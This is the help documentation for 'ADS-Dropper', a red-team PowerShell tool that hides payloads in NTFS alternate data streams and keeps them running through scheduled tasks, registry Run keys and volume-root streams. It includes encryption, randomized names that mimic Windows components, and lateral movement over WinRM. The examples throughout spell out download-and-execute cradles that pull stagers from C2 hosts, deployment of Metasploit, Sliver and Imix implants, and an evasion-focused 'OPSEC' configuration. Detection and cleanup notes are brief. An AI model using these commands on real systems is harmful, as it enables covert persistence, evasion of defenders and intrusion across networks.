# ADS-Dropper Help System

## ADS-Dropper v2.1 – C2-Agnostic NTFS Persistence Framework

---

## SYNOPSIS

ADS-Dropper v2.1 - C2-Agnostic NTFS Persistence Framework

---

## DESCRIPTION

ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry, WMI, Volume Root ADS).

Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.

Includes AES-256 encryption, randomization, and privilege adaptation.

---

## PARAMETERS

### `-Payload` **[REQUIRED]**

The payload to deploy.

Accepts:
- **String**: PowerShell command or script
- **Array**: File path to payload script (e.g., `@('payload.ps1')`)

Examples:

```powershell
"IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
@('C:\payloads\imix_stager.ps1')
"Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
```

---

### `-Targets`

Target hosts for deployment.  
Default: `@('localhost')`

- `'localhost'` = Local deployment
- Remote IPs/hostnames = Lateral movement via WinRM (requires `-Credential`)

Examples:

```powershell
-Targets @('localhost')
-Targets @('10.10.10.50', 'dc01.corp.local')
```

---

### `-Persist`

Persistence methods (comma-separated).  
Default: `@('task')`

Available methods:

- `task` – Scheduled Task (requires admin, logon + periodic triggers)
- `reg` – Registry Run key (works as user or admin)
- `volroot` – Volume Root ADS (requires admin, novel technique)

Examples:

```powershell
-Persist @('task')
-Persist @('task', 'reg')
-Persist @('volroot')
```

---

### `-Randomize`

Enable randomization for evasion:

- Random file/stream names (mimics legitimate Windows ADS)
- Random loader names (`app_log_*.vbs` / `.ps1`)
- Random task names (GUIDs)

Breaks signature-based detection but makes cleanup harder.

Example:

```powershell
-Randomize
```

---

### `-Encrypt`

Enable AES-256 encryption of payload in ADS.

- Key derived from machine UUID + hostname (deterministic per-system)
- Automatically switches to PowerShell loader (VBScript can't decrypt)
- Payload stored as Base64-encoded ciphertext

Example:

```powershell
-Encrypt
```

---

### `-NoExec`

Stage artifacts (ADS, loader, persistence) **WITHOUT executing**.

Use for:
- Pre-staging during recon phase
- Testing deployment without triggering C2 callbacks
- Verifying artifacts before execution

Example:

```powershell
-NoExec
```

---

### `-Credential`

PSCredential for remote deployment (WinRM authentication).  
Required when `-Targets` includes remote hosts.

Example:

```powershell
-Credential (Get-Credential)
```

---

## EXAMPLES

### Basic local deployment (unencrypted, scheduled task)

```powershell
.\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
```

Description:

- Stores payload in `C:\ProgramData\SystemCache.dat:syc_payload`
- Creates VBScript loader at `C:\ProgramData\app_log_a.vbs`
- Registers scheduled task:  
  `\Microsoft\Windows\Customer Experience Improvement Program\UsbCeip`
- Executes immediately

---

### Encrypted deployment with randomization (RECOMMENDED FOR OPSEC)

```powershell
$payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')"
.\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
```

Description:

- AES-256 encrypts payload (key from UUID+hostname)
- Random file: `C:\ProgramData\CacheSvc.log`
- Random stream: `:SmartScreen` or `:Zone.Identifier`
- Random loader: `app_log_kqmxyz.ps1`
- Random task: `\Microsoft\Windows\UX\a3f5b2c1`

---

### Multi-method persistence (belt-and-suspenders)

```powershell
.\ADS-Dropper.ps1 -Payload $c2Stager -Persist @('task', 'reg') -Encrypt
```

Description:

Creates TWO persistence methods:

1. Scheduled task (SYSTEM-level, periodic execution)
2. Registry Run key (user-level, executes on logon)

Ensures survival even if one method is detected/removed.

---

### Volume root ADS (novel technique, requires admin)

```powershell
.\ADS-Dropper.ps1 -Payload $beacon -Persist @('volroot') -Randomize
```

Description:

- Stores execution command in `C:\:ads_1234`
- Creates task: `\Microsoft\Windows\Maintenance\WinSAT_567`
- Task executes:

```powershell
powershell -Command "Get-Content 'C:\:ads_1234' | IEX"
```

- Survives directory deletions (no parent file)

---

### Stage without execution (recon phase)

```powershell
.\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
```

Manual trigger later via:

```powershell
wscript.exe //B C:\ProgramData\app_log_a.vbs
```

---

### Lateral movement to multiple hosts

```powershell
$cred = Get-Credential
$targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local')
.\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
```

---

### Realm C2 (Imix agent) deployment – CCDC scenario

```powershell
$imixStager = Get-Content .\imix_stager.txt -Raw
.\ADS-Dropper.ps1 -Payload $imixStager -Persist @('task', 'reg') -Encrypt -Randomize -Verbose
```

---

### Metasploit reverse shell

```powershell
$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
.\ADS-Dropper.ps1 -Payload $msfPayload -Persist @('task') -Encrypt
```

---

### Sliver implant deployment

```powershell
$sliverStager = @('C:\payloads\sliver_beacon.ps1')
.\ADS-Dropper.ps1 -Payload $sliverStager -Persist @('volroot') -Randomize -Encrypt
```

---

### Custom persistent command (non-C2)

```powershell
$customBeacon = @'
while($true) {
  "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append
  Start-Sleep -Seconds 300
}
'@
.\ADS-Dropper.ps1 -Payload $customBeacon -Persist @('reg')
```

---

## NOTES

File Name: ADS-Dropper.ps1  
Author: Louis (https://github.com/yourusername)  
Prerequisite: PowerShell 5.1+, NTFS filesystem, Windows 10+  
Version: 2.1  

---

## MITRE ATT&CK Mapping

- T1564.004 – Hide Artifacts: NTFS File Attributes  
- T1053.005 – Scheduled Task/Job  
- T1547.001 – Registry Run Keys  

---

## Detection

- Sysmon Event ID 15 – FileCreateStreamHash  
- Windows Event ID 4698 – Task Created  
- Windows Event ID 4657 – Registry modification  

---

## Cleanup

```powershell
.\tests\cleanup.ps1 -Targets @('localhost')
```

---

## Links

GitHub: https://github.com/yourusername/ADS-Dropper  
Blog: https://yourusername.github.io/blog/ads-dropper  

---

## Research Credits

- Oddvar Moe: https://oddvar.moe  
- Enigma0x3: https://enigma0x3.net  
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/  

---

## Outputs

Console output showing deployment progress:

- Admin status  
- Target hosts  
- Persistence methods  
- ADS creation confirmation  
- Loader path  
- Success/failure status  

Remote deployments return hashtable with:

- Success (bool)  
- Artifacts (hashtable)  
- Error (string, if failed)  

---

## Component Requirements

Requires NTFS filesystem  
Requires PowerShell remoting (WinRM) for lateral movement  

---

## Role

Red Team / Penetration Testing  

---

## Authorized Use Only

- Penetration testing with written permission  
- CCDC and similar competitive exercises  
- Security research in isolated labs  

Unauthorized use is illegal and unethical.

---

## Functionality

Persistence, Execution, Defense Evasion
